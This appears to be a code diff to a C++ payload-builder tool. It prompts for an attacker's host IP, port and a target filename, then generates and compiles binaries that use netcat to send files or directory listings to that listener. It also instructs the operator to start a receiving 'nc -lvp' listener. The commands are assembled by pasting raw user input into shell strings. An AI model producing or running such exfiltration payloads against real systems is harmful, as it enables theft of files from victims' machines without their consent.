@@ -35,22 +35,32 @@ int main(){
                 system(sys_call.c_str());
                 break;
             case '2':
-                cout << "This requires a listener with and output. Start one with:\n"
+                cout << "This requires a listener with an output."
+                        " Start one with:\n"
                         "    nc -lvp [port] > [file destination]\n";
+                cout << "Host IP:\n";
+                getline(cin, ip);
+                cout << "Host Port:\n";
+                getline(cin, port);
                 cout << "Filename:\n";
                 getline(cin, retrieval_filename);
                 config_file.open("payload2_config.h");
-                config_file << "std::string command = ";
+                config_file << "std::string command = \"nc " + ip + " " + port
+                                + "< $(find / -name '" + retrieval_filename
+                                + "' 2>/dev/null)\";";
+                config_file.close();
                 sys_call = TOOLCHAIN + " ./payload2.cpp -o payload";
+                system(sys_call.c_str());
                 break;
             case '3':
                 cout << "Directory's absolute path:\n";
                 getline(cin, path);
-                command = "ls -la " + path;
                 config_file.open("payload3_config.h");
-                config_file << "std::string command = \"" << command << "\";";
+                config_file << "std::string command = \"ls -la " + path
+                                + " | nc " + ip + " " + port + "\";";
                 config_file.close();
                 sys_call = TOOLCHAIN + " ./payload3.cpp -o payload";
+                system(sys_call.c_str());
                 break;
             case '4':
                 cout << "This requires a listener. Start one with:\n"
@@ -64,6 +74,7 @@ int main(){
                 config_file << "std::string command = \"" << command << "\";";
                 config_file.close();
                 sys_call = TOOLCHAIN + " ./payload4.cpp -o payload";
+                system(sys_call.c_str());
                 break;
             case '5':
                 quit = true;
